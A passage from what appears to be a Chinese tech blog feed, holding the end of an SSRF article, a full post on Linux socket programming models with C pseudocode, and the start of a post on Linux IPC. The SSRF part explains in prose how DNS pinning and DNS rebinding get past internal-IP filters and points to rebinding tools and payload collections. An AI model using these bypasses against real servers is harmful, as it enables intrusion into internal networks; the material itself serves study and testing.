src="/myimages/ssrf之内网漫游/Abusing_URL_Parsers2.png" alt="image"></p><h2 id="Abusing-URL-Parsers"><a href="#Abusing-URL-Parsers" class="headerlink" title="Abusing_URL_Parsers"></a>Abusing_URL_Parsers</h2><blockquote><p>图片来自 参考链接[7]</p></blockquote><p><img src="/myimages/ssrf之内网漫游/Abusing_URL_Parsers.png" alt="image"></p><h2 id="DNS-pinning-与-DNS-rebinding"><a href="#DNS-pinning-与-DNS-rebinding" class="headerlink" title="DNS pinning 与 DNS rebinding"></a>DNS pinning 与 DNS rebinding</h2><p>这是另一种比较高端的绕过ip限制的方式。我们试想这样一种场景，存在ssrf可利用的服务器对内网ip进行了十分严密的过滤，我们找不到直接的绕过思路。那么这个时候就可以利用DNS来大作文章。大致的实现思路有两种：</p><ol><li>DNS pinning：引导服务器访问一个域名，这个域名的解析权在我们可控的DNS服务器上，那么我们可以将这个域名地址指定为一个内网地址，那么就饿可以绕过对ip的正则。</li><li>DNS rebinding：抓住验证和curl的两个事务间的时间间隔,让我们的域名服务器第一次域名查询反回不触犯过滤规则的ip，第二次域名查询反回内网ip。就可以绕过。需要注意的是必须要避免DNS缓存，如设置<code>ttl=0</code>。</li></ol><blockquote><p>有个自动化的DNS rebinding框架可以使用： <a href="https://github.com/mwrlabs/dref。" target="_blank" rel="noopener">https://github.com/mwrlabs/dref。</a><br>更多相关细节移步另一篇文章：DNS relevance。</p></blockquote><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a><br>[2] <a href="https://joychou.org/web/phpssrf.html#" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html#</a><br>[3] <a href="http://brieflyx.me/2015/linux-tools/socat-introduction/" target="_blank" rel="noopener">http://brieflyx.me/2015/linux-tools/socat-introduction/</a><br>[4] <a href="http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf" target="_blank" rel="noopener">http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf</a><br>[5] <a href="https://github.com/cujanovic/SSRF-Testing" target="_blank" rel="noopener">https://github.com/cujanovic/SSRF-Testing</a><br>[6] <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection</a><br>[7] <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a><br>[8] <a href="http://www.zerokeeper.com/web-security/ssrf-learning-notes.html" target="_blank" rel="noopener">http://www.zerokeeper.com/web-security/ssrf-learning-notes.html</a><br>[9] <a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf" target="_blank" rel="noopener">D2T2-YuHong-Attack Surface Extended by URL Schemes.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 绕过 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux socket 编程模型总结</title>
      <link href="/2018/12/11/Linux-socket-%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E6%80%BB%E7%BB%93/"/>
      <url>/2018/12/11/Linux-socket-%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>socket编程作为互联网间进程通信手段之一，是必须掌握的一项基本技能。也值备考之余，打算好好梳理以下socket编程在实际使用中的模型。从协议上分，socket编程可以分为TCP或者UDP socket；从IO方式上分有阻断式和非阻断式；从处理逻辑结构上分可以有循环式和并发式两种。不同的分类下又对应着具体的实现模型，这些实现相当灵活，不同分类之间没有实现上的间隙，很多应用场景中是交织的。所以要想学好socket编程，除了掌握基本的函数API，还应该对这些分类以及实现模型有个认知。这也是作者写下这篇梳理文章的动机。<br><a id="more"></a></p><h1 id="阻塞IO模型"><a href="#阻塞IO模型" class="headerlink" title="阻塞IO模型"></a>阻塞IO模型</h1><p>由于网络传输是有延迟的，每个socket的收发都相当于一次次IO操作。在阻塞式IO模式中，程序会在涉及socket操作的一系列函数上进行阻塞。直到相关socket事务处理完后才继续程序逻辑。这是默认的socket策略，也即如果我们不自定义设置socket参数，默认会执行IO阻塞式操作。那么也许有人会问，一个进程在进行IO阻塞的时候一直暂用cpu，岂不是会影响其他进程的运行？答案式否定的。这个问题涉及到了linux系统进程调度的问题，虽然对理解这个IO阻塞没有很大联系。但是可以加深下对操作系统的理解。在linux系统中，存在有时间片的机制。避免IO密集型的进程在进行大量IO操作的时候独占cpu资源，所以会根据时间片来对进程进行运行时切换。这样可以很大的提高系统cpu的使用率。好了大致解释了以下IO密集性的基本概念，我们来看下哪些函数操作在默认socket参数下是会造成IO阻塞的。<br>涉及IO阻塞的函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">产生阻塞的函数—读操作：read、readv、recv、recvfrom和recvmsg</span><br><span class="line">产生阻塞的函数—写操作：write、writev、send、sendto和sendmsg</span><br><span class="line">产生阻塞的函数—建立连接：connect</span><br><span class="line">产生阻塞的函数—TCP接受连接：accept</span><br></pre></td></tr></table></figure></p></blockquote><p>可以看到，只要涉及网络传输的函数就会存在阻塞。阻塞在socket编程中是个中性词，与非阻塞相比，没有好换优略之分，主要看业务需求。以下是阻塞式IO的特点：</p><ul><li>结构简单，易同步；</li><li>进程可能永远阻塞或阻塞时间过长；</li><li>阻塞时进程效率低</li><li>由于系统对IO密集型进程的调度作用，不会长时间占用CPU（时间片机制）</li></ul><p>使用阻塞模式的套接字，开发网络程序比较简单，容易实现。当希望能够立即发送和接收数据，且处理的套接字数量比较少的情况下，使用阻塞模式来开发网络程序比较合适。套接字相关函数默认时采用阻塞方式操作，而大多数情况下，程序不仅仅只拥有一个套接字。当进程以阻塞方式操作其中之一时，必将导致不能使用其他的套接字。如果希望这些套接字同时工作，就必须设计并发的套接字程序，即在一个套接字读写的同时保证另一个套接字也能正常地操作。设计并发的方法有循环里，创建子进程或者使用子线程处理每个recive的socket_fd,这样就会使得阻塞只在单个线程或者单个进程内发生。下面将会介绍这种模型。</p><h2 id="并发创建子进程模型-创建子线程模型"><a href="#并发创建子进程模型-创建子线程模型" class="headerlink" title="并发创建子进程模型/创建子线程模型"></a>并发创建子进程模型/创建子线程模型</h2><p>这种模型的出现，其实是为了解决阻塞式IO下，程序并行效率底下的问题。通过对每一个处理请求使用多进程或多线程的处理机制，可以将阻塞效应限制在单个进程或线程内，带来很好的并发体验。并发创建子进程模型/创建子线程模型伪代码流程如下（注意到为了突出功能，省略了一些错误处理）：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化socketfd</span></span><br><span class="line">init_socket();</span><br><span class="line"><span class="comment">//bind </span></span><br><span class="line">bind(...);</span><br><span class="line"><span class="comment">//listen</span></span><br><span class="line">listen(...);</span><br><span class="line"><span class="comment">//循环 accept</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    newsocket=accept(......);</span><br><span class="line">    <span class="keyword">if</span>(newsocket)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fork()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//子进程处理逻辑</span></span><br><span class="line">            close(socketfd)</span><br><span class="line">            dosomething();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//父进程关闭当轮循环newsocket</span></span><br><span class="line">    close(newsocket) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="延迟创建子进程模型"><a href="#延迟创建子进程模型" class="headerlink" title="延迟创建子进程模型"></a>延迟创建子进程模型</h2><p>之前我们看到的并发创建子进程模型，其在实现上仍旧有可以改进的地方。首先创建子进程的开销非常的大，如果一个很小的处理业务我们都为其创建一个单独进程，无疑是个不明智的选择，所以我们希望简单业务直接主进程循环内部解决，这就是延迟创建子进程模型；同样的，如果当有链接建立请求到来后再创建子进程无疑会影响用户体验，所以我们希望可以预先创建好子进程，这就是下一节要说的预创建子进程。在延迟创建子进程模型中，我们需要一个评判机制，对来自客户端的业务复杂程度进行判断，考虑是是否需要创建子进程。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化socketfd</span></span><br><span class="line">init_socket();</span><br><span class="line"><span class="comment">//bind </span></span><br><span class="line">bind(...);</span><br><span class="line"><span class="comment">//listen</span></span><br><span class="line">listen(...);</span><br><span class="line"><span class="comment">//循环 accept</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    newsocket=accept(......);</span><br><span class="line">    <span class="keyword">if</span>(newsocket)&#123;</span><br><span class="line">        <span class="keyword">if</span>(predictor())&#123;<span class="comment">//预测器判断是否需要进行创建子进程，如果需要就进行创建子进程操作</span></span><br><span class="line">            <span class="keyword">if</span>(fork()==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//子进程处理逻辑</span></span><br><span class="line">                close(socketfd)</span><br><span class="line">                dosomething();</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            process_in_while()<span class="comment">//如果判定不需要创建子进程，则将处理逻辑放在while循环内</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//父进程关闭当轮循环newsocket</span></span><br><span class="line">    close(newsocket) </span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><h2 id="预创建子进程模型"><a href="#预创建子进程模型" class="headerlink" title="预创建子进程模型"></a>预创建子进程模型</h2><p>所谓的预创建子进程，其模型存在的意义就是为了解决用户请求时创建子进程时的进程创建开销。其具有如下特点：</p><ul><li>所有子进程调用accept，无连接时将睡眠；有连接到来时子进程被唤醒；某一个子进程接受连接后，其他进程继续睡眠。</li><li>响应速度快，节省创建子进程时间。</li></ul><p>当然根据预创建的子进程数量是否固定，又可以分为固定预创建子进程模型和动态创建子进程模型。在固定创建子进程模型中，我们需要预先估计好可能会到来的客户端链接数量，预创建子进程数量少时将导致客户端等待，预创建子进程数量多时将浪费系统资源。但是在动态创建模型中就没有这一限制。</p><p>固定模型其具体的流程如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化socketfd</span></span><br><span class="line">init_socket();</span><br><span class="line"></span><br><span class="line"><span class="comment">//关键步骤，设置socket地址复用</span></span><br><span class="line"><span class="keyword">int</span> n=<span class="number">1</span>;</span><br><span class="line">setsockopt(socketfd,SOL_SOCKET,SO_REUSEADDR,&amp;n,<span class="keyword">sizeof</span>(n));</span><br><span class="line"><span class="comment">//bind </span></span><br><span class="line">bind(...);</span><br><span class="line"><span class="comment">//listen</span></span><br><span class="line">listen(...);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环创建指定数量的子进程</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;MAXPROCESS;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(pid[i]=fork()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//在每个子进程中采用循环socket模式进行accept操作</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            connfd=accept();</span><br><span class="line">            do_something();</span><br><span class="line">            close(connfd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="comment">//退出时清除回收所有子进程</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;MAXPROCESS;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(pid[i]&gt;<span class="number">0</span>)kill(pid[i],SIGTERM);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">while</span>(wait(<span class="literal">NULL</span>)&gt;<span class="number">0</span>)&#123;&#125;</span><br></pre></td></tr></table></figure></p><p>动态模型的大体流程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器建立socket，并创建一定数量子进程</span><br><span class="line">服务器父进程维护所有子进程的状态表，父进程和子进程通过管道通信</span><br><span class="line">子进程接受连接时给父进程发1，关闭连接时发0</span><br><span class="line">父进程收到1时检查空闲子进程数目是否小于下限，小于下限则创建新的子进程</span><br><span class="line">父进程收到0时检查空闲子进程数目是否大于上限，大于上限则终止一些子进程</span><br></pre></td></tr></table></figure></p><h2 id="select-高并发web服务器模型"><a href="#select-高并发web服务器模型" class="headerlink" title="select 高并发web服务器模型"></a>select 高并发web服务器模型</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> nfds, fd_set* readfds, fd_set* writefds, fd_set* execptfds, struct timeval* timmeout)</span></span>;</span><br><span class="line"></span><br><span class="line">            nfds:     监控的文件描述符集里最大文件描述符加<span class="number">1</span>, 因为此参数会告诉内核横测前多少个文件描述符的状态</span><br><span class="line"></span><br><span class="line">            readfds:  监控有读数据到达文件描述符集合, 传入传出参数</span><br><span class="line"></span><br><span class="line">            writefds: 监控写数据到达文件描述符集合, 传入传出参数</span><br><span class="line"></span><br><span class="line">            execptfds:监控异常发生达文件描述符集合, 如带外数据到达异常,</span><br><span class="line"></span><br><span class="line">            timeout:  设置阻塞监控时间,<span class="number">3</span>种情况</span><br><span class="line"></span><br><span class="line">                    <span class="number">1.</span> <span class="literal">NULL</span> 永远等下去</span><br><span class="line"></span><br><span class="line">                    <span class="number">2.</span> 设置timeval, 等待固定的时间</span><br><span class="line"></span><br><span class="line">                    <span class="number">3.</span> 设置timeval里时间均为<span class="number">0</span>, 检查描述字后立即返回, 轮询</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set* <span class="built_in">set</span>)</span></span>;            <span class="comment">//把文件描述符集合里初始化为0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_SET</span><span class="params">(<span class="keyword">int</span> fd, fd_set* <span class="built_in">set</span>)</span></span>;     <span class="comment">//把文件描述符集合里fd位置1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="keyword">int</span> fd, fd_set* <span class="built_in">set</span>)</span></span>;     <span class="comment">//把文件描述符集合里fd位置0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FD_ISSET</span><span class="params">(<span class="keyword">int</span> fd, fd_set* <span class="built_in">set</span>)</span></span>;    <span class="comment">//测试文件描述符集合里fd是否为1 有返回1, 没有返回0</span></span><br></pre></td></tr></table></figure><h1 id="非阻塞IO模型"><a href="#非阻塞IO模型" class="headerlink" title="非阻塞IO模型"></a>非阻塞IO模型</h1><p>对比阻塞式IO模型，在很多方面是要比非阻塞IO在性能上带来很大的提高。当然其同步问题也是需要注意，而且可能让编程逻辑变得相当复杂的一个点。对比阻塞式IO模型，- 非阻塞式IO有以下特点：</p><ul><li>不会产生阻塞；</li><li>输入方式效率比较高；</li><li>长时间占用CPU，属于CPU密集型进程；</li></ul><p>通设置套接字的参数，我们可以将默认的阻塞IO变成非阻塞IO：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">函数fcntl，设置O_NONBLOCK选项</span><br><span class="line"><span class="keyword">int</span> flags;</span><br><span class="line">flags=fcntl(sockfd,F_GETFL,<span class="number">0</span>);</span><br><span class="line">fcntl(sockfd, F_SETFL, flags|O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">函数ioctl，设置FIONBIO选项</span><br><span class="line"><span class="keyword">int</span> on=<span class="number">1</span>;</span><br><span class="line">ioctl(sockfd, FIONBIO, &amp;on);</span><br></pre></td></tr></table></figure></p><h1 id="信号驱动IO模型"><a href="#信号驱动IO模型" class="headerlink" title="信号驱动IO模型"></a>信号驱动IO模型</h1><p>信号驱动IO，当有数据到达的时候，系统内核发出SIGIO，通过自定义的信号处理函数对这个信号进行相关处理。其程序流程大致如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义SIGIO信号处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigio_handle</span><span class="params">(<span class="keyword">int</span> sig)</span></span>&#123;</span><br><span class="line">    send_or_recv_something()</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注册信号处理函数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span>;</span></span><br><span class="line">act.sa_handler=sigio_handler;</span><br><span class="line">act.sa_flags=<span class="number">0</span>;</span><br><span class="line">sigaction(SIGIO,&amp;act,<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//设置套接字所有者为当前进程</span></span><br><span class="line">fcntl(sockfd,F_SETOWN,getpid());</span><br><span class="line"><span class="comment">//设置信号驱动模式</span></span><br><span class="line"><span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">ioctl(sockfd,FIOASYNC,&amp;i);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></p><h1 id="超时控制模型"><a href="#超时控制模型" class="headerlink" title="超时控制模型"></a>超时控制模型</h1><p>在超时控制模型中，我们通过等待一个预设定的时间后产生SIGALRM信号，信号将会被之前设定的信号接受函数进行处理，选择重发或者跳过相关逻辑。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义信号处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigalarm_handler</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注册信号处理函数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span>;</span></span><br><span class="line">act.sa_handler=sigalarm_handler;</span><br><span class="line">act.sa_flags=<span class="number">0</span>;</span><br><span class="line">sigaction(SIGALRM,&amp;act,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在需要计时的地方调用alarm(time),如</span></span><br><span class="line">sendto(......)</span><br><span class="line">alarm(<span class="number">5</span>)<span class="comment">//等待5秒</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><h1 id="带外数据模型"><a href="#带外数据模型" class="headerlink" title="带外数据模型"></a>带外数据模型</h1><p>带外数据模型是一种处理紧急套接字数据的方式，带外数据拥有比一般数据高的优先级。其具有以下几个特性。</p><ul><li>TCP没有独立的带外数据通道，而是通过“紧急方式（urgent mode）”将紧急数据插入正常数据流中进行传送。通过URG标志表明数据流中存在带外数据，通过紧急指针指向紧急数据的位置（一个正的偏移量）。</li><li>需要注意的是套接字支持的带外数据只有一个字节，超过一个字节会将最后一个字节偏移作为紧急指针位置，前面的字节作为正常数据传输。</li><li>当由紧急指针指向的实际带外数据到达接收端TCP时，系统根据SO_OOBINLINE套接字选项设置与否将该带外数据放入不同缓冲区：未设置SO_OOBINLINE选项（缺省）：默认情况下带外数据被放入独立的（单字节）带外数据缓冲区中。设置了SO_OOBINLINE选项：带外数据被放入正常套接字缓冲区中（inline）进程使用普通接收函数进行读取，比如read或recv，不能指定MSG_OOB标志，否则出错；读取带外数据之前应先判断下一字节是否为带外数据（如 sock_at_mark函数）。但是一般情况下我们不会把带外数据与正常的数据流混在一起。而是通过设置自定义的信号来捕获URG标志随带的信号</li></ul><p>涉及到的接受发送带外数据函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">send(sockfd,msg,<span class="number">1</span>,MSG_OOB);</span><br><span class="line">recv(sockfd,rec_buff,BUFSIZE,MSG_OOB);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//当带外数据与正常数据一同存放的时候，需要设置判断函数，其实现过程如下：</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_at_mark</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag;</span><br><span class="line"><span class="keyword">if</span>( ioctl(fd,SIOCATMARK,&amp;flag) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> (flag!=<span class="number">0</span>?<span class="number">1</span>:<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>带外数据模型的流程如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">客户端在需要发送带外数据的时候调用：</span><br><span class="line">send(sockfd,msg,<span class="number">1</span>,MSG_OOB);</span><br><span class="line"></span><br><span class="line">服务端基于信号(SIGURG)触发的带外数据处理流程：</span><br><span class="line"><span class="comment">//设置信号触发处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">signal_urg</span><span class="params">(<span class="keyword">int</span> signo)</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    recv(connfd,buf,<span class="keyword">sizeof</span>(buf)<span class="number">-1</span>,MSG_OOB);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *old_signal_urg_handle;<span class="comment">//保存以前的信号处理</span></span><br><span class="line">old_signal_urg_handle=signal(SIGURG,signal_urg);</span><br><span class="line"><span class="comment">//更改套接字属主，因为SIGURG信号只会发送给套接字属主</span></span><br><span class="line">fcntl(socket,F_SETOWN,getpid())</span><br><span class="line"><span class="comment">//下面是正常的socket流程</span></span><br><span class="line">......</span><br><span class="line"><span class="comment">//处理完后记得将SIGURG信号还原</span></span><br><span class="line">signal(old_signali_urg_handle,SIGURG);</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux 进程间通信</title>
      <link href="/2018/12/11/linux-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/"/>
      <url>/2018/12/11/linux-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>进程间通信（InterProcess Communication，IPC）是指在不同进程之间传播或交互信息；进程的用户空间是相互独立的，一般而言是无法互相访问的。但是很多时候我们需要进程间的通信机制来丰富程序的内容，所以操作系统为我们提供了进程间通信的一系列系统调用。常用的进程间通信的手段有：管道以及命名管道，消息队列，信号与信号量，共享内存，套接字（包括本机域套接字）。当然广义上来说还包括一些磁盘I/O，以及外设等。注意明确一个概念：信号与信号量是不同的机制。信号（signal）是一种处理异步事件的方法，它是由硬件或软件触发，再由操作系统内核发送给应用程序的中断形式；<br>信号灯（semaphore）是一种实现进程间同步、互斥的机制，是一种数据操作锁的概念。<br><a id="more"></a></p><h1 id="无名管道"><a href="#无名管道" class="headerlink" title="无名管道"></a>无名管道</h1><p>管道使数据以一种数据流的方式在进程间流动，相当于文件系统中的一个文件，来缓存所要传输的数据由于是匿名，无法在文件系统中以任何方式看到该管道，它只是进程的一种资源，会随着进程的结束而被系统清除。无名管道具有以下特点：</p><ul><li>半双工，数据流向具有单向性，一个进程向管道中写的内容被管道另一端的进程读出。双向通信需要建立两个管道</li><li>只能用于父子进程或者兄弟进程之间（具有血缘关系的进程）；</li><li>管道对于两端的进程来说就是一个文件，但不是普通文件，它只存在于内存中；</li><li>管道的缓冲区是有限的，在管道创建时，为缓冲区分配一个页面大小的空间（默认为4k字节）；</li><li>传送的是无格式字节流，要求管道的读出方和写入方必须事先约定好数据的格式</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe</span><span class="params">(<span class="keyword">int</span> fd[<span class="number">2</span>])</span></span>; </span><br><span class="line">参数：</span><br><span class="line">fd－用于通信的一对文件描述符，fd[<span class="number">0</span>]用于读，fd[<span class="number">1</span>]用于写</span><br><span class="line">返回值：<span class="number">0</span>－成功，<span class="number">-1</span>－失败</span><br></pre></td></tr></table></figure><p>注意到无名管道不是全双工的，所以当需要两个进程互传消息的时候，需要使用两个pipe。</p><h1 id="命名管道"><a href="#命名管道" class="headerlink" title="命名管道"></a>命名管道</h1><p>命名管道，即named 